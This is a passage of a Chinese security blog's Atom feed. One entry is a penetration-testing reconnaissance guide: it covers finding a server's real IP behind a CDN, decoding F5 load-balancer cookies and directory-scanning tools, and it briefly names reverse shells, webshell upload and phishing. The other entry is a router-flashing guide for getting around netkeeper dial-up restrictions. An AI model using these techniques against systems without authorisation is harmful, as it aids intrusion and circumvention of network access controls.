厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</li><li>网站漏洞查找：<ul><li>1、目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</li><li>2、XSS盲打，命令执行反弹shell，SSRF等。</li><li>3、无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</li></ul></li><li>网站邮件订阅查找：RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</li><li>用 Zmap 扫全网：需要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。</li><li>F5 LTM解码法：当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</li></ul></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>网站目录和敏感文件扫描是网站测试中最基本的手段之一。如果通过该方法发现了网站后台，可以尝试暴库、SQL注入等方式进行安全测试；如果发现敏感目录或敏感文件，能帮我们获取如php环境变量、robots.txt、网站指纹等信息；如果扫描出了一些上传的文件，我们甚至可能通过上传功能（一句话恶意代码）获取网站的权限。</p><ul><li>目录扫描原理：通过请求返回的信息来判断当前目录或文件是否真实存在。网站后台扫描工具都是利用目录字典进行爆破扫描，字典越多，扫描到的结果也越多。</li><li>工具：<ul><li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li><li>yjdirscan（御剑目录扫描专业版）：<a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></li><li>7kbscan-WebPathBrute：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></li><li>Dirmap：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></li><li>DirBuster：Kali Linux提供的目录扫描工具</li><li>webdirscan：<a href="https://github.com/TuuuNya/webdirscan">https://github.com/TuuuNya/webdirscan</a></li></ul></li></ul><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><ul><li>社工库</li><li>邮件钓鱼</li><li>客服</li><li>构造字典</li><li>…..</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;在平常的渗透测试的过程中，最重要也是最首要的一步就是信息收集，在这个阶段我们要尽可能的收集目标组织的信息，所谓“知</summary>
      
    
    
    
    <category term="Web安全" scheme="https://kb-at-zero.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="信息收集" scheme="https://kb-at-zero.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="https://kb-at-zero.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>路由破解-netkeeper拨号</title>
    <link href="https://kb-at-zero.github.io/2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/"/>
    <id>https://kb-at-zero.github.io/2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/</id>
    <published>2018-09-01T06:04:00.000Z</published>
    <updated>2021-04-20T13:07:19.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="斐讯k2拨号开无线"><a href="#斐讯k2拨号开无线" class="headerlink" title="斐讯k2拨号开无线"></a>斐讯k2拨号开无线</h1><ul><li><p>1、刷breed 详细教程见文件<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/K2.breed.doc">斐讯K2刷breed教程</a>。</p></li><li><p>2、k2拔掉电源后长按复位键不松手并插上电源线等待连续多个白灯同时迅速闪烁几次后再松手。</p></li><li><p>3、必须用网线连接电脑和路由器，浏览器输入192.168.1.1，进入breed界面。</p></li><li><p>4、依次点击：固件更新，勾选固件选项好自动重启，点击选择文件，选择固件，点击开始刷新并确认。</p></li><li><p>5、等待刷机完成后路由自动重启。</p></li><li><p>6、重启完成后浏览器输入192.168.1.1进入固件设置界面，登录默认用户名root，密码admin，登录以后将浏览器最小化等待后续使用。</p></li><li><p>7、打开winscp.exe，File protocol选择SCP，Host name输入192.168.1.1，User name输入root，Password输入admin，点击Login登录，出现Warning提示窗口点击Update即可进入。</p></li><li><p>8、此时界面左边文件栏是本地的，右边是路由器的，左边定位到教程和相关文件所在文件夹，右边多次点击..返回根目录，依次点击路径usr-lib-pppd-2.4.7，将左边栏目里shandongmobile_sxplugin.so拖动到右边并右击选择Properties（属性），出来的界面中将输入框里面默认的0644改成0755并确定保存。</p></li><li><p>9、右边多次点击..返回路由器根目录，双击打开tmp文件夹，左边右击confnetwork.sh选择Edit，在出来的界面将账号，密码填写完并保存，然后将此文件拖动到右边tmp文件夹内。</p></li><li><p>10、打开指令.txt，找到winscp界面靠近左上角一个黑色命令行按钮，点击打开，将指令.txt里面的上下两个指令（chmod a+x /tmp/confnetwork.sh&nbsp;&nbsp;&nbsp;&nbsp; sh /tmp/confnetwork.sh）依次复制粘贴到输入框里面并点击Execute，每输入一个指令都点击一下Execute，两个指令顺序千万不能反，第二指令如果弹窗出现任何信息都重新点击Execute操作，第二指令正常操作应该是光标变成沙漏样式好几秒以后恢复正常。</p></li><li><p>11、打开步骤6的浏览器，点击左边栏目系统-重启，点击执行重启，路由器重启完成会重新出现设置界面登录的信息，登录以后点击系统-系统，点击两次蓝色方框的同步浏览器时间按钮，每次都是等待时间变化后再点击一次等待显示时间和电脑时间相同时再立即插上网线，此时就可以正常上网了。</p></li><li><p>12、每次给路由器断电后必须拔掉网线，然后再通电开机，手机或电脑连接路由后登录设置界面并点击系统-系统，点击同步浏览器时间，然后立即插上网线开始上网。</p></li></ul><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h1><p><strong>1、网线直到教程结束前都不要插上路由器，否则完全无法成功且必须重新操作一遍教程步骤。</strong></p><p><strong>2、一旦路由出现任何问题无法上网时必须将教程除了刷breed以外再次完整操作一遍，否则无法上网</strong>。</p><p><strong>3、breed中备份固件功能请勿使用，备份出来的netkeeper网配置好的固件刷进去依旧会造成无法拨号上网的情况并需要重新将教程操作一遍</strong>。</p><p><strong>4、如果步骤7提示被拒绝，就浏览器输入192.168.1.1登录设置界面，点击系统-管理权，设置新密码然后再回到winscp改成对应密码再登录。</strong></p><p><strong>5、步骤11点击两次同步时间是点一次就连网线有小几率会出现后续配置完全失败得重新操作的情况。</strong></p><p><strong>特别注意：本文章只供学习用途。</strong></p><p>附上全部教程与文件（<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default1.zip">第一部分</a>&nbsp; <a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default2.zip">第二部分</a>）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;斐讯k2拨号开无线&quot;&gt;&lt;a href=&quot;#斐讯k2拨号开无线&quot; class=&quot;headerlink&quot; title=&quot;斐讯k2拨号开无线&quot;&gt;&lt;/a&gt;斐讯k2拨号开无线&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1、刷breed 详细教程见文件&lt;a href=&quot;https://</summary>
      
    
    
    
    <category term="路由器" scheme="https://kb-at-zero.github.io/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
    <category term="WIFI" scheme="https://kb-at-zero.github.io/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/WIFI/"/>
    
    
    <category term="netkeeper" scheme="https://kb-at-zero.github.io/tags/netkeeper/"/>
    
    <category term="无线破解" scheme="https://kb-at-zero.github.io/tags/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
